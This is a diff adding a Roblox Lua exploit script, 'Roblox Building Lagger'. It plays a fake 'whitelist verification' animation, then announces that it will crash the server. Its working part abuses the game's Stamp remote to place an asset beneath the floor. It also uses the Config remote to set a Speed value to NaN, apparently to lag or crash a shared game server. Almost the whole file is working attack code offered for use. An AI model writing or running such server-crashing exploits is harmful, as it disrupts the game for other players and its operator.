@@ -1,0 +1,99 @@
+--Welcome to Roblox Building Lagger--
+--------------------------------------
+
+game:GetService("StarterGui"):SetCore("SendNotification",{     
+Title = "erazias#0001",     
+Text = "whitelist verification in line",
+Button1 = "",Button2 = "",     Duration = 10, })
+
+print("erazias made this - dont steal or bozo")
+
+local Message = Instance.new("Message", workspace)
+Message.Text = "verying user."
+wait(0.1)
+Message.Text = "verying user.."
+wait(0.1)
+Message.Text = "verying user..."
+wait(0.1)
+Message.Text = "verying user."
+wait(0.1)
+Message.Text = "verying user.."
+wait(0.1)
+Message.Text = "verying user..."
+wait(1)
+Message.Text = "user id confirming."
+wait(1)
+Message.Text = "user id confirming.."
+wait(1)
+Message.Text = "confirmed"
+wait(1)
+Message.Text = "username confirming."
+wait(1)
+Message.Text = "username confirming.."
+wait(1)
+Message.Text = "confirmed"
+wait(2)
+Message.Text = "successfully verified"
+wait(1)
+Message.Text = "crashing soon.."
+wait(0.5)
+Message:Destroy()
+
+game:GetService("StarterGui"):SetCore("SendNotification",{     
+Title = "erazias#0001",     
+Text = "now fucking the server using erazias' method",
+Button1 = "",Button2 = "",     Duration = 69420, })
+
+local BuildingAreas = workspace:WaitForChild("BuildingAreas")
+local StampFunction = game:GetService("ReplicatedStorage"):WaitForChild("BuildingBridge"):WaitForChild("Stamp")
+local ConfigFunction = game:GetService("ReplicatedStorage"):WaitForChild("BuildingBridge"):WaitForChild("Config")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local FloorMeshPart = workspace:WaitForChild("Floor"):WaitForChild("MeshPart")
+
+local function PlaceBlock(AssetId,CFrame)
+   return StampFunction:InvokeServer(AssetId,CFrame)
+end
+
+local function FindPlayerPlot(Player)
+   for _,v in pairs(BuildingAreas:GetChildren()) do
+       if v:IsA("Model") then
+           local PlotOwnerName = v.Player.Value
+           if PlotOwnerName == Player.Name then
+               return v
+           end
+       end
+   end
+   return nil
+end
+
+local LocalPlayerPlot = FindPlayerPlot(LocalPlayer)
+if LocalPlayerPlot then
+   local PlayerBaseplate = LocalPlayerPlot.PlayerArea.BasePlate
+   local YPosition = (FloorMeshPart.Position.Y - (FloorMeshPart.Size.Y/2)) -2
+   local XPosition = PlayerBaseplate.Position.X
+   local ZPosition = PlayerBaseplate.Position.Z
+   
+   local TargetCFrame = CFrame.new(Vector3.new(XPosition,YPosition,ZPosition))
+   StampFunction:InvokeServer(
+       65819976,
+       TargetCFrame
+   )
+   while true do
+       local success = false
+       for _,v in pairs(LocalPlayerPlot.PlayerArea:GetDescendants()) do
+           if v.Name == "Speed" and v.Parent.Name == "Configuration" then
+               ConfigFunction:InvokeServer(
+                   v,
+                   tonumber("nan")
+               )
+               success = true
+               break
+           end
+       end
+       task.wait(0.2)
+       if success then
+           break
+       end
+   end
+end
